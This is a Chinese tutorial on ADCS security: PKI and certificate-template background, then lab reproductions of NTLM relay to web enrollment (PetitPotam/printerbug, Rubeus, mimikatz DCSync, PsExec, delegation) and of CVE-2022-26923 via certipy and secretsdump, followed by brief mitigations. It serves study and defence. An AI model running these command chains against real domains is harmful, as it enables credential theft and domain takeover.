## 漏洞背景

2021年6月17日，国外安全研究员 Will Schroeder 和 Lee Christensen 共同发布了针对ADCS(Active
Directory Certificate Service, 活动目录证书服务)的攻击手法。同年8月5日，在Black Hat 2021上 Will
Schroeder 和 Lee CHristensen 对该攻击手法进行了详细讲解。至此，ADCS攻击第一次进入人们的视野。

2022年5月10日，微软发布5月份安全补丁更新，其中CVE-2022-26923漏洞引起了人们的注意，这是一个域内权限提升漏洞，该漏洞允许低特权用户在安装了ADCS的默认活动目录环境中将权限提升为域管理员，危害极大。

## 基础知识

### PKI

PKI（Public Key
Infrastructure，公钥基础设施）是提供公钥加密和数字签名服务的系统或平台，是一个包括硬件、软件、人员、策略和规程的集合，实现基于公钥密码体制的密钥和证书的产生、管理、存储、分布和撤销等功能。企业通过采用KPI框架管理密钥和证书，可以建立一个安全的网络环境。

PKI的基础技术包括公钥加密、数字签名、数据完整性机制、数字信封（混合加密）、双重数字签名等。PKI体系能够实现的功能包括身份验证、数据完整性、数据机密性、操作的不可否认性。

微软的ADCS就是PKI的实现，ADCS能够与现有的ADDS进行结合，用于身份验证、公钥加密和数字签名等。ADCS提供所有与PKI相关的组件作为角色服务。每个角色服务负责证书基础架构的特定部分，同时协同以工作形成完整的解决方案。

#### CA

CA（Certificate
Authority，证书颁发机构）是PKI系统的核心，其作用包括处理证书申请、证书发放、证书更新、管理已颁发的证书、吊销证书和发布证书吊销列表（CRL）等。

ADCS中的CA有企业CA和独立CA。企业CA必须是域成员，并且通常处于联机状态以颁发证书或证书策略。独立CA可以是成员、工作组或域。独立CA不需要ADDS，并且可以在没有网络的情况下使用。但是在域中基本都是使用企业CA，因为企业CA可以和ADDS进行结合，其信息也存储在活动目录数据库中。企业CA支持基于证书模块创建证书和自动注册证书。

CA拥有公钥和私钥：

  * 私钥只有CA知道，私钥用于对颁发的证书进行数字签名

  * 公钥任何人都可以知道，公钥用于验证证书是否由CA颁发

那么，如何让客户端机器信任CA呢？

我们平时访问https类型的网站，如百度，通过查看其证书可以看到它的根CA，并且显示此证书有效，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524075_64770e6ba72a852624edf.png!small)

由于已经导入了我们系统信任的CA，因此通过该根CA颁发的所有证书都是可信的。如图所示，可以看到我们系统信任的根CA，百度的根CA为GlobalSign
Root CA。

![图片.png](https://image.3001.net/images/20230531/1685524091_64770e7bae68eaac0270a.png!small)

而在活动目录中自己搭建的ADCS，由于安装企业根CA时，系统使用组策略将根CA添加到域内所有机器的“受信任的根证书颁发机构”中了，因此域内机器默认都信任此根CA颁发的证书。

如图所示，在域内机器上的“受信任的根证书颁发机构”内可以看到我们的根CA为hack-ADCS-CA

![图片.png](https://image.3001.net/images/20230531/1685524106_64770e8aaed565851d794.png!small)

如图所示，在根CA颁发的证书中可以看到已经颁发的证书，以下证书应用的网站会被域内所有的机器信任。

![图片.png](https://image.3001.net/images/20230531/1685524121_64770e990bbfe9fbd3d0f.png!small)

如图所示，在域内机器上访问Exchange邮箱服务，可以看到提示安全连接。但如果在域内机器访问该Exchange邮箱服务，会提示证书无效。

![图片.png](https://image.3001.net/images/20230531/1685524136_64770ea891f572c3703e2.png!small)

如图所示，可以看到浏览器提示证书无效。因为域外机器并没有在“受信任的根证书颁发机构”中添加域内搭建的根CA。

![图片.png](https://image.3001.net/images/20230531/1685524149_64770eb561be689cea04e.png!small)

那么如何能让域外的机器也信任域内搭建的根CA颁发的证书呢？很简单，就是把我们域内搭建的根CA的证书导入到系统中即可，操作如下：

1）访问ADCS证书服务器的/certsrv/certcarc.asp路径，单击“下载CA证书”，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524160_64770ec0d28c838e12651.png!small)

2）将下载的CA证书导入系统“受信任的根证书颁发机构”中，并选择“始终信任”选项，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524172_64770eccbd35770893e78.png!small)

3）使用浏览器再次再次访问Exchange邮箱服务，即可看到信任此证书，显示安全连接，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524184_64770ed8a26803255041a.png!small)

#### CA层次结构

常见的CA层次结构有两个级别：根和二级CA。二级CA也叫子从属CA。根CA位于顶级，子从属CA位于二级。在这种层次结构下，根CA给子从属CA颁发的证书认证，子从属CA给下面的应用颁发和管理证书，根CA不直接给应用颁发证书。

如图所示是常见的CA层次结构：

![图片.png](https://image.3001.net/images/20230531/1685524197_64770ee562dc9b9045187.png!small)

CA的层次结构有以下的优点：

  * 管理层次分明，便于集中管理，政策制定和实施

  * 提高CA中心的总体性能、减少瓶颈

  * 有充分的灵活性和可扩展性

  * 有利于保证CA中心的证书验证效率

#### CRL

CRL（Certificate Revoncation
List，证书作废列表）即“证书黑名单”，在证书有效期期间、由于某种原因(如人员调动、私钥泄露等)导致相应的数字证书内容不再真实可信，此时需要进行证书撤销，说明该证书无效，CRL中列出了被撤销的证书序列号。

### PKINIT Kerberos认证

在之前的Kerberos协议篇中我们讲了在AS-REQ请求过程中，Kerberos域身份认证使用的是用户Hash加密时间戳。而ADCS与ADDS紧密配合使用，那么自然会猜想，能否利用证书来进行Kerberos预身份认证呢？

答案是可以的，在[在RFC4556 Public Key Cryptography for Initial Authentication in
Kerberos (PKINIT) ](https://www.rfc-editor.org/rfc/rfc4556.html)中引入了对Kerberos预身份验证的公钥加密技术支持，可以使用证书的密钥来进行Kerberos预身份认证。

如图所示，使用Rubeus执行如下命令用证书administrator.pfx进行Kerberos认证

    
    
    Rubeus.exe asktgt /user:Administrator /certificate：administrator.pfx /domain:hack.com /dc:DC.hack.com
    

![图片.png](https://image.3001.net/images/20230531/1685524216_64770ef8c1d8e7ddd46f5.png!small)

在认证过程中使用wireshark抓包。如图所示，可以看到在AS-REQ请求包的预认证字段为pA-PK-AS-REQ。在这个阶段，客户端发送包含证书内容的请求包，并使用证书私钥对其进行签名作为预认证数据。

![图片.png](https://image.3001.net/images/20230531/1685524230_64770f06ca3012c5906ff.png!small)

KDC在收到客户端发来的AS-REQ请求包后，使用证书的公钥对签名进行校验，校验通过后发送AS-REP回复包，其中包含krbtgt加密的TGT和证书公钥加密的Logon Session Key。

注意到在微软的官方文档中有这样一句话：为了支持连接到不支持Kerberos身份验证的网络服务的应用程序NTLM的身份验证，当使用PKCA时，KDC将在PAC特权属性证书的PAC_CREDENTIAL_INFO缓冲区中返回用户的NTLM
Hash。

也就是说当使用证书进行Kerberos认证时，返回的票据的PAC中是包含用户的NTLM Hash的。

如图所示，使用kekeo执行如下命令获得administrator.pfx证书对应的administrator用户的NTLM Hash。

    
    
    tgt::pac /subject:administrator /castore:current_user /domain:域名 /user:administrator /cred
    

![图片.png](https://image.3001.net/images/20230531/1685524249_64770f19db3294013fa31.png!small)

后续无论administrator用户密码怎么更改，使用administrator.pfx证书获取的administrator用户的NTLM
Hash都是最新的，因此，可以利用这一点进行权限维持。

 **注意** ：使用kekeo获取证书对应用户的NTLM Hash时，需要先将证书导入到系统中。

### 证书模板

证书模板（Certificate
templates）是CA的一个组成部分，是证书策略中的重要元素，是用于证书注册、使用和管理的一组规则和格式。当CA收到对证书的请求时，必须对该请求应用一组规则和设置，以执行所请求的功能，例如证书颁发或更新。这些规则可以是简单的，也可以是复杂的，也可以适用于所有用户或特定的用户组。

证书模板是在CA上配置并应用于传入证书请求的一组规则和设置。证书模板还向客户机提供了关于如何创建和提交有效的证书请求的说明。基于证书模板的证书只能由企业CA颁发。这些模板存储在ADDS中，以供林中的每个CA使用。这允许CA始终能够访问当前标准模板，并确保跨林应用一致。

证书模板通过允许管理员发布已为选定任务预先配置的证书，可以大大简化管理证书颁发机构(CA)的任务。证书模板管理单元允许管理员执行以下任务：

  * 查看每个证书模板的属性

  * 复制和修改证书模板

  * 控制哪些用户和计算机可以读取模板并注册证书

  * 执行与证书模板相关的其他管理任务

如图所示，在ADCS服务器上执行certmpl.msc命令打开证书模板控制台，可以看到系统默认的证书模板。

![图片.png](https://image.3001.net/images/20230531/1685524270_64770f2e3d1eae863f9d4.png!small)

如果想查看或修改某个模板的属性，可以选中该模板，然后右击，选择“属性”选项进行查看。由于系统默认的模板绝大部分不可修改的属性，因此使用这种方式查看的模板属性较少。我们可以通过复制模板操作来查看模板的更多的属性，选中要查看属性的模板，右击，选择“复制模板”选项，会弹出“新模板的属性”对话框，在该对话框中可以查看模板的全部属性，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524283_64770f3bef0193f868b90.png!small)

 **注意** ：系统默认的证书模板绝大部分不允许修改，我们也不建议对系统默认的证书模板进行修改，如果想修改，建议先复制一个模板，然后在对其进行修改。

上面提到了利用证书能进行PKINIT Kerberos认证，但是并不是所有的证书都能进行PKINIT
Kerberos认证。那么，到底哪些模板的证书可用于Kerberos认证呢？

在[Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)中提到了具有以下扩展权限的证书可以用于Kerberos认证：

  * 客户端身份验证，对应的OID为1.3.6.1.5.5.7.3.2

  * PKINIT客户端身份验证，对应的OID为1.3.6.1.5.2.3.4

  * 智能卡登录，对应的OID为1.3.6.1.4.1.311.20.2.2

  * 任何目的，对应的OID为2.5.29.37.0

  * 子CA

#### 用户模板

用户模板是默认的证书模板。如图所示，可以看到其扩展属性里有客户端身份验证，因此用户模板申请的证书可以用于Kerberos身份认证。如图所示可以看到默认情况下Domain
Users都有权限注册用户模板的证书。

![图片.png](https://image.3001.net/images/20230531/1685524298_64770f4a1847d31adc589.png!small)

![图片.png](https://image.3001.net/images/20230531/1685524305_64770f51d0839a05ed9be.png!small)

如图所示，使用certipy执行如下命令以普通用户hack权限申请注册一个用户模板的证书。

    
    
    certipy req -dc-ip 192.168.41.10 -u hack@hack.com -p Admin123 -target 192.168.41.60 -ca hack-SEVER2016-CA -template User -debug
    

![图片.png](https://image.3001.net/images/20230531/1685524318_64770f5eea6791776e245.png!small)

#### 计算机模板

计算机模板是默认的证书模板。如图所示，可以看到其扩展属性里有客户端身份验证，因此计算机模板申请的证书可以用于Kerberos身份认证。

![图片.png](https://image.3001.net/images/20230531/1685524332_64770f6c270e193fb7051.png!small)

如图所示，可以看到默认情况下Domain Computers都有权限注册计算机模板的证书。

![图片.png](https://image.3001.net/images/20230531/1685524344_64770f786e7be7b80c568.png!small)

如图所示，使用certipy执行如下命令以普通机器用户machine$权限申请注册一个计算机模板的证书。

    
    
    certipy req -u 'machine$'@hack.com -p pzxx2NLn8mvEQ9Zk -target 192.168.41.60 -ca hack-SEVER2016-CA -template  Machine
    

![图片.png](https://image.3001.net/images/20230531/1685524357_64770f85340bb26be2fd9.png!small)

### 证书注册

现在来看看证书的注册流程，如图所示，是Will Schroeder和Lee Christensen发布的Certified_Pre-Owned白皮书里面画的证书注册流程：

![图片.png](https://image.3001.net/images/20230531/1685524369_64770f91001d888c73f70.png!small)

从图中可以看到，证书的注册流程如下：

  * 1）客户端生成一对公、私钥

  * 2）客户端生成证书签名请求(CSR，Certificate Signing  
Request)，里面包含客户端生成的公钥以及请求的证书模板、请求的主体等信息。整个CSR用客户端的私钥签名，发送给CA

  * 3）CA收到请求后，从中取出公钥对CSR进行签名校验。校验通过后判断客户证书注册端请求的证书模板是否存在，如果存在，根据证书模板中的属性判断请求的主体是否有权限申请该证书。如果有权限，则还要根据其他属性，如发布要求、使用者名称、扩展等属性来生成证书。

  * 4）CA使用其私钥签名生成的证书并发送给客户端

  * 5）客户端存储该证书在系统中

可以执行certmgr.msc命令管理用户证书，执行certmgr.msc命令管理机器证书。在管理证书窗口可以进行新证书的申请、查找和导入等操作。如图所示分别是用户证书管理窗口和机器证书管理窗口。

![图片.png](https://image.3001.net/images/20230531/1685524382_64770f9e5a4773b76d4ee.png!small)

![图片.png](https://image.3001.net/images/20230531/1685524390_64770fa61e45abda04d88.png!small)

下面演示给用户申请一个证书。执行certmgr.msc命令打开用户证书管理窗口，选择“个人”--->“证书”，然后右击，选择“所有任务（K）”--->"申请新证书（R）"
选项，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524405_64770fb52c13fa5a2c058.png!small)

在弹出的”证书注册“窗口选择证书的模板，然后单击"注册“按钮即可，如图所示，这里选择的是”Kerberos身份验证“模板。

![图片.png](https://image.3001.net/images/20230531/1685524416_64770fc09ec94e22ade2e.png!small)

证书注册好以后，就可以在证书管理窗口看到，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524428_64770fcc2a547d6796898.png!small)

还有一些其他接口也可用于证书的注册，在安装ADCS时可供选择，如网络设备注册服务、证书颁发机构Web注册、证书注册Web服务。

在这里着重讲一下证书颁发机构Web注册接口。

如果在安装ADCS时勾选了”证书颁发机构Web注册“选项，如图所示，那么可以通过Web方式来申请证书。

![图片.png](https://image.3001.net/images/20230531/1685524440_64770fd837ac166a19232.png!small)

如图所示，访问ADCS的 localhost/Certsrv/路径即可该注册的接口，需要输入有效的用户名和密码进行认证。

![图片.png](https://image.3001.net/images/20230531/1685524451_64770fe3b5186cf8e8ffd.png!small)

输入了有效的用户名和密码后，即可看到申请证书等功能，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524462_64770fee3ec148ec06869.png!small)

### 导出证书

在某些场景下，我们需要导出的证书来运行一些的操作。在导出证书前，需要先查看证书的Hash。因此需要先查看证书的信息。如下的命令可用于查看用户证书和机器证书的信息。

    
    
    #查看用户证书
    certutil -user -store My
    #查看机器证书
    certutil -store My
    

如图所示，查看用户证书时，需要记住证书信息中的Cert Hash（sha1）的内容。

![图片.png](https://image.3001.net/images/20230531/1685524474_64770ffa8bd9e2e6600a3.png!small)

然后执行如下的命令导出证书

    
    
    #导出用户证书
    certutil -user -store My 证书的hash C:\user.cer
    #导出包含公私钥的用户证书，会要求输入密码
    certutil -user -exportPFX 证书的hash C:\user.pfx
    #导出机器证书
    certutil -store My 证书的hash C:\machine.cer
    #导出包含公私钥的机器证书，会要求输入密码
    certutil -exportPFX 证书的hash C:\machine.pfx
    

如图所示，导出包含公私钥的用户证书，在这个过程中会要求输入密码，密码可以任意设置。后续将这个证书导入系统的时候会要求输入该密码。

![图片.png](https://image.3001.net/images/20230531/1685524486_64771006f1384d13faa6d.png!small)

由于有些证书模板设置了私钥不允许导出，如域控证书模板，因此使用该命令导出包含公钥私钥的证书时会失败，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524523_6477102bb39c920be35d7.png!small)

![图片.png](https://image.3001.net/images/20230531/1685524532_6477103438bf97d96db56.png!small)

针对不允许导出私钥的证书，如域控证书模板，可以使用mimikatz执行如下的命令，结果如图所示：

    
    
    mimikatz.exe
    crypto::capi
    crypto::certificates /systemstore:local_machine /store:my /export
    

![图片.png](https://image.3001.net/images/20230531/1685524549_64771045d950bd5eaf310.png!small)

## ADCS的安全问题

### Web证书注册接口NTLM Realy攻击

#### 漏洞原理

该漏洞产生的主要原因是ADCS支持Web注册，也就是ADCS服务在安装的时候勾选了“证书颁发机构Web注册”选项，导致用户可以通过Web来申请注册证书。而Web接口默认只允许NTLM身份认证，如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524565_64771055b4c69d61e6875.png!small)

由于HTTP类型的NTLM流量默认是不签名的，因此造成了NTLM Realy的攻击。攻击者可以利用Print
Spooler漏洞或Petitpotam漏洞触发目标机器SMB类型的NTLM流量回连攻击机器，然后再将这个SMB类型的NTLM流量中继给Web注册证书接口以目标机器权限申请一个证书。攻击者拿到该证书后就可以以目标机器权限进行Kerberos身份认证了。

#### 漏洞复现

以下演示通过NTLM Relay 攻击如下不同的目标：

  * 域控

  * Exchange邮箱服务器

  * 域内普通机器

为什么要选这三种机器呢? 由于使用了Print
Spooler漏洞或者PetitPotam漏洞触发的都是目标机器账户的Hash，因此其通过NTLM中继到证书注册接口请求的证书也是机器账户的，而这三种机器账户的权限各有不同：

  * 域控的机器账户拥有DCSync权限，可以导出域内任意用户的Hash

  * Exchange邮箱服务器的机器账户可以直接用于远程登录连接

  * 域内普通机器账户可以结合基于资源的约束性委派进行利用，获得最高权限

实验环境如下：

  * 域控DC（同时也是证书服务器）：192.168.41.10

  * 域控DC2：192.168.41.40

  * 邮箱服务器Exchange：192.168.41.50

  * 域内普通机器Server2016：当前登录域普通用户hack\hack，IP：192.168.41.60

  * 域内普通机器Win10：192.168.41.15

  * 安全研究员机器：192.168.41.19

首先定位域内证书服务器。执行如下的命令定位证书服务器，如图所示，可以看到定位到的证书服务器为DC.hack.com。

    
    
    certutil -config - -ping
    

![图片.png](https://image.3001.net/images/20230531/1685524584_6477106832f89fff4da70.png!small)

以下演示通过NTLM Relay+ADCS+PetitPotam/Print Spooler对域控进行利用。

首先在安全研究员的机器中执行如下的命令进行监听：

    
    
    python3 ntlmrelayx.py -t http://192.168.41.10/certsrv/certfnsh.asp -smb2support --adcs --template 'domain controller'
    

![图片.png](https://image.3001.net/images/20230531/1685524596_647710749431a57096710.png!small)

接着使用Print Spooler或PetitPotam漏洞触发域控对DC2回连安全研究员的机器，如图所示，使用Print Spooler漏洞触发。

    
    
    #使用PetitPotam漏洞触发
    python3 PetitPotam.py -d hack.com -u hack -p Admin123 192.168.41.19 192.168.41.40
    #使用Print Spooler漏洞触发
    python3 printerbug.py hack/hack:Admin123@192.168.41.40 192.168.41.19 
    

![图片.png](https://image.3001.net/images/20230531/1685524610_64771082cf6609bef753a.png!small)

攻击完成之后，就可以看到安全研究员的机器已经收到了域控DC2连接过来的NTLM流量并成功中继到了证书服务器。

![图片.png](https://image.3001.net/images/20230531/1685524622_6477108e7071a158a0141.png!small)

如图所示，可以看到成功打印出域控DC2 base64 格式的证书了

 **注意** ：如果打印出多个证书，随便选择一个即可

然后再域内普通机器Server2016上使用Rubeus执行如下的命令，以DC$的身份，证书为凭据，请求TGT导入当前的内存中，并生成ticket.kirbi的TGT。

    
    
    Rubeus.exe asktgt /user:DC2$ /ptt /nowrap /outfile:ticket.kirbi /certificate:打印出的的base64格式的证书
    

![图片.png](https://image.3001.net/images/20230531/1685524634_6477109ad7e0295cf30d0.png!small)

票据导入内存中，就可以通过mimikatz运行如下的命令使用DCSync功能导出域内任意用户的Hash了。

    
    
    mimikatz.exe "lsadump::dcsync /domain:hack.com /user:krbtgt /csv" "exit"
    

如图所示，可以看到请求的票据前无法通过mimikatz的DCSync功能导出域内的任意用户的Hash，请求票据成功后，导出成功。

![图片.png](https://image.3001.net/images/20230531/1685524647_647710a77b492be9e8514.png!small)

##### 攻击Exchange邮箱服务器

以下演示通过NTLM Relay+ADCS+PetitPotam/Print Spooler对Exchange邮箱服务器进行利用。

首先再安全研究员的机器中执行如下的命令进行监听：

    
    
    python3 ntlmrelayx.py -t http://192.168.41.10/certsrv/certfnsh.asp -smb2support --adcs
    

![图片.png](https://image.3001.net/images/20230531/1685524663_647710b70c92b7808552c.png!small)

接着使用PetitPotam/Print Spooler漏洞触发Exchange邮箱服务器Exchange回连安全研究员的机器。

    
    
    #使用PetitPotam漏洞触发
    pyhon3 PetitPotam.py -d hack.com -p Admin123 192.168.41.19 192.168.41.50
    #使用Print Spooler漏洞触发
    python3 printerbug.py hack/hack:Admin123@192.168.41.50 192.168.41.19 
    

![图片.png](https://image.3001.net/images/20230531/1685524677_647710c5855eb2765a365.png!small)

利用完成之后，就可以看到安全研究员的机器收到了Exchange邮箱服务Exchange连接过来的NTLM流量并成功中继给了证书服务器。

如图所示，可以看到成功打印出Exchange邮箱服务器Exchange的base64格式的证书了。

![图片.png](https://image.3001.net/images/20230531/1685524692_647710d42685cd3c60a63.png!small)

接着再域内普通机器Server2016上使用Rubeus运行如下的命令，以Exchange$的身份，证书为凭据，请求TGT导入当前的内存中，并生成ticket.kirbi的TGT。

    
    
    Rubeus.exe asktgt /user:Exchange$ /ptt /nowrap /outfile:ticket.kirbi /certificate:打印出的的base64格式的证书
    

![图片.png](https://image.3001.net/images/20230531/1685524707_647710e3cd920c9e2c923.png!small)

票据导入内存中，就可以通过psexec.exe执行如下的命令远程连接Exchange邮箱服务器Exchange了，如图所示，成功获得Exchange邮箱服务器Exchange的System权限。

    
    
    PsExec.exe \\Exchange -s cmd.exe
    

![图片.png](https://image.3001.net/images/20230531/1685524719_647710efc782dfb236895.png!small)

##### 攻击域内普通机器

以下演示通过NTLM Relay+ADCS+PetitPotam/Print Spooler+基于资源的约束性委派对域内普通机器进行利用。

首先在安全研究员的机器中执行如下的命令进行监听：

    
    
    python3 ntlmrelayx.py -t http://192.168.41.10/certsrv/certfnsh.asp -smb2support --adcs
    

![图片.png](https://image.3001.net/images/20230531/1685524734_647710fe7514ce84dcead.png!small)

接着使用PetitPotam/Print Spooler漏洞触发域内普通机器Win10回连安全研究员的机器。

    
    
    #使用PetitPotam漏洞触发
    pyhon3 PetitPotam.py -d hack.com -p Admin123 192.168.41.19 192.168.41.15
    #使用Print Spooler漏洞触发
    python3 printerbug.py hack/hack:Admin123@192.168.41.15 192.168.41.19 
    

![图片.png](https://image.3001.net/images/20230531/1685524754_6477111201287842b6bf6.png!small)

利用完成之后，就可以看到安全研究员的机器收到了域内普通机器Win10连接过来的NTLM流量并成功中继给了证书服务器。

如图所示，可以看到成功打印出域内普通机器的Win10的base64格式证书了。

![图片.png](https://image.3001.net/images/20230531/1685524764_6477111cc9fcdc39aca10.png!small)

接着在域内普通机器Server2016上使用Rubeus运行如下的命令，以Win10$的身份，证书为凭据，请求TGT导入当前的内存中，并生成ticket.kirbi的TGT。

    
    
    Rubeus.exe asktgt /user:Win10$ /ptt /nowrap /outfile:ticket.kirbi /certificate:打印出的的base64格式的证书
    

![图片.png](https://image.3001.net/images/20230531/1685524776_64771128a60e776d61dbf.png!small)

票据导入内存中，就可以通过相关工具创建机器的账户，然后配置创建的机器账户到机器Win10的基于资源的约束性委派。

    
    
    add_rbcd_machine.exe domain=hack.com dc=DC.hack.com tm=Win10 ma=machine mp=root
    

如图所示，可以看到导入证书后，配置基于资源的约束性委派成功。

接着使用Rebeus执行如下的命令进行基于资源的约束性委派的利用，以下administrator的权限请求cifs/win10.hack.com的ST。

    
    
    Rubeus.exe s4u /user:machine$ /rc4:329153f560eb329c0eldeea55e88ale9 /domain:hack.com /msdsspn:cifs/Win10.hack.com /impersonateuser:administrator /ptt
    

![图片.png](https://image.3001.net/images/20230531/1685524791_6477113734153018823c7.png!small)

如图所示，进行基于资源的约束性委派攻击后，可成功访问Win10

![图片.png](https://image.3001.net/images/20230531/1685524803_64771143980be8b7fe460.png!small)

### CVE-2022-26923域内提权漏洞

#### 漏洞原理

该漏洞产生的主要原因是ADCS服务器在处理计算机模板证书时是通过机器的dNSHostName属性来辨别用户的，而普通域用户即有权限修改它所创建的机器账户dNSHostName属性，因此恶意攻击者可以创建一个机器账户，然后修改它的dNSHostName属性为域控的dNSHostName，然后去请求计算机模板的证书。ADCS服务器在生成证书时会将域控的dNSHostName属性写入证书中。当使用进行PKINI
Kerberos认证时，KDC会查询活动目录中的sAMAccountName属性为“dNSHostName-域名+$"的对象，此时会查询到域控，因此会以域控机器账户的权限生成PAC放入票据中。由于域控机器账户默认具有DCSync权限，因此攻击者可以通过该票据导出域内任意用户的Hash。

机器账户请求计算机模板证书并进行PKINI Kerberos认证流程图如图所示：

![图片.png](https://image.3001.net/images/20230531/1685524818_647711528f33ab75dce49.png!small)

#### 漏洞复现

实验环境如下：

  * 域：hack.com

  * 域控：DC（192.168.41.10）

  * ADCS服务器（非域控，普通域内机器）：Sever2016（192.168.41.60）

  * CA名称：hack-SEVER2016-CA

  * 普通域用户：hack/hack：Admin123

首先在攻击机器配置如下hosts

    
    
    192.168.41.10      DC.hack.com
    

然后执行如下的命令定位ADCS服务器，查询结果如图所示，主要记住Name和Server参数的值。

    
    
    #在域内的话，可以执行如下命令定位证书服务器
    certutil -config - -ping
    #或者下面的命令，不弹框定位
    certutil -dump -v
    

![图片.png](https://image.3001.net/images/20230531/1685524834_64771162b9c6fc927c047.png!small)

![图片.png](https://image.3001.net/images/20230531/1685524843_6477116b6f676f2c914a5.png!small)

接着执行如下的命令利用用户hack远程创建机器账户machine，并且设置其dnsHostname属性为DC.hack.com，执行结果如图所示：

    
    
    certipy account create -u hack@DC.hack.com -p Admin123 -dc-ip 192.168.41.10 -user "machine" -dns "DC.hack.com" -debug
    

![图片.png](https://image.3001.net/images/20230531/1685524858_6477117a94e706383e425.png!small)

可以从图中看出我们所创建的机器账户密码为ckHKXHOMLQEA0fSq

在执行如下的命令以machine$身份请求一个Machine类型的证书，执行结果如图所示，由于机器账户的machine$的dnsHostname已经设置为DC.hack.com,因此返回的是以域控DC身份请求的证书dc.pfx

    
    
    certipy req -u 'machine$'@hack.com -p ckHKXHOMLQEA0fSq -target 192.168.41.60 -ca hack-SEVER2016-CA -template  Machine
    

![图片.png](https://image.3001.net/images/20230531/1685524869_64771185593cf6a44add7.png!small)

最后执行如下的命令用dc.pfx证书进行Kerberos认证，从返回的票据PAC中得到域控DC机器的账户的NTLM Hash，如图所示：

    
    
    certipy auth -pfx dc.pfx -dc-ip 192.168.41.10 -debug
    

![图片.png](https://image.3001.net/images/20230531/1685524885_647711952b7b8d7c9e152.png!small)

由于域控机器账户默认再域内DCSync权限，因此可以到处任意账户的NTLM Hash。如图所示，可以导出域内管理员的administration的NTLM
Hash。

    
    
    python3 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:209366c6c5292a7a6f3add57ad356ee5 "hack/DC\$@192.168.41.10" -just-dc-user administrator
    

![图片.png](https://image.3001.net/images/20230531/1685524898_647711a28847588f682df.png!small)

## 漏洞预防和修复

对于防守方或蓝队来说，如何针对ADCS相关漏洞进行预防和修复呢？企业人员可先查看企业内网域内网环境是否存在ADCS，如不存在则不影响，如果企业内网域内环境存在ADCS，则查看是否开启了证书颁发机构Web的功能，如果开启了该功能，则查看该功能是否有必要。如无必要，关闭即可。如未开启，则不受影响。同时，对域环境进行及时补丁更新以修补CVE-2022-26923漏洞。

